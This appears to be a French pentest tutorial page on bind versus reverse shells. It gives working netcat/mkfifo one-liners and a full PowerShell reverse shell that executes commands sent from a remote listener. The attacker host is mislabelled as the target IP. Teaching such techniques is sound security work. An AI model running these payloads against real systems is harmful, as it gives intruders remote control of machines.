# Types de shells : bind et reverse

## Pourquoi

Deux grands types de shells distants existent : le bind shell et le reverse shell. Chacun a ses avantages et ses contraintes. Savoir quand utiliser l'un ou l'autre depend du contexte reseau, des pare-feux en place et du niveau d'acces obtenu sur la cible.

## Comment ca marche

### Bind shell

Dans un bind shell, la cible ouvre un port et attend une connexion entrante. L'attaquant se connecte ensuite a ce port pour obtenir le shell. La cible joue le role de serveur, l'attaquant celui de client.

{% hint style="warning" %}
Le bind shell est rarement utilisable en conditions reelles. Les pare-feux bloquent generalement les connexions entrantes non autorisees, et le NAT empeche souvent d'atteindre un port ouvert sur une machine interne.
{% endhint %}

### Reverse shell

Dans un reverse shell, c'est la cible qui initie la connexion vers l'attaquant. L'attaquant lance un listener sur sa machine et attend que la cible se connecte. La connexion est sortante du point de vue de la cible, ce qui la rend beaucoup plus difficile a bloquer.

{% hint style="success" %}
Le reverse shell est la methode privilegiee en pentest. Les connexions sortantes sont rarement filtrees, surtout sur les ports courants (80, 443).
{% endhint %}

## En pratique

### Bind shell avec Netcat

**Sur la cible (listener) :**

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 0.0.0.0 4444 > /tmp/f
```

**Sur l'attaquant (connexion) :**

```bash
nc -nv <IP_CIBLE> 4444
```

Decomposition du one-liner :
- `mkfifo /tmp/f` cree un pipe nomme (FIFO)
- `cat /tmp/f | /bin/bash -i` envoie le contenu du pipe vers un Bash interactif
- `2>&1` redirige stderr vers stdout
- `nc -l ... > /tmp/f` recoit les commandes et les injecte dans le pipe

### Reverse shell avec Netcat

**Sur l'attaquant (listener) :**

```bash
nc -lvnp 443
```

**Sur la cible :**

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP_CIBLE> 443 > /tmp/f
```

Le port 443 est souvent choisi car il correspond au trafic HTTPS, rarement filtre en sortie.

### Reverse shell PowerShell (Windows)

**Sur l'attaquant :**

```bash
nc -lvnp 443
```

**Sur la cible Windows :**

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP_CIBLE>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback + 'PS ' + (pwd).Path + '> ');$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

{% hint style="warning" %}
Ce payload PowerShell est detecte par Windows Defender et la plupart des EDR. En environnement securise, il faut l'adapter ou utiliser une alternative.
{% endhint %}

## Pieges et galeres

- Netcat n'est pas installe nativement sur Windows. Il faut le transferer ou utiliser PowerShell.
- Le bind shell expose un port ouvert sur la cible, ce qui peut etre detecte par un scan de port.
- Les reverse shells non chiffres transmettent les commandes en clair. Un IDS peut les intercepter.
- Le choix du port est important : les ports 80 et 443 passent mieux les pare-feux, mais les proxys HTTP peuvent inspecter le trafic.

## Retour terrain

En mission, le reverse shell est utilise dans 95% des cas. Le bind shell n'est pertinent que dans des situations tres specifiques (reseau interne sans filtrage, lab). Avoir plusieurs variantes de reverse shell pretes (Bash, PowerShell, Python) permet de s'adapter rapidement selon ce qui est disponible sur la cible.

## Memo express

| Type | Direction de la connexion | Avantage principal | Inconvenient principal |
|---|---|---|---|
| Bind shell | Attaquant → Cible | Simple a comprendre | Bloque par les pare-feux entrants |
| Reverse shell | Cible → Attaquant | Contourne les filtres sortants | Necessite un listener cote attaquant |

***
